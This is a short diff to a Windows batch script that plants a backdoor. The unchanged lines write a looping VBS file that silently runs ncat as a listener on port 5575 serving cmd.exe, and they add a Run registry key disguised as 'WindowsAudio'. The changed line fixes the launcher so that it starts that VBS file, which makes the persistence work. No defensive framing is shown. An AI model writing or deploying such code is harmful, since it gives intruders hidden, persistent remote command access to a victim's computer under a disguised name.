@@ -9,7 +9,7 @@ echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "
 echo Loop >> "%USERPROFILE%\Downloads\audio.vbs"
 
 echo @echo off > "%USERPROFILE%\Downloads\audio.bat"
-echo start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.bat" >> "%USERPROFILE%\Downloads\audio.bat"
+echo start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs" >> "%USERPROFILE%\Downloads\audio.bat"
 echo exit >> "%USERPROFILE%\Downloads\audio.bat"
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\Downloads\audio.bat" /f > nul 2>&1
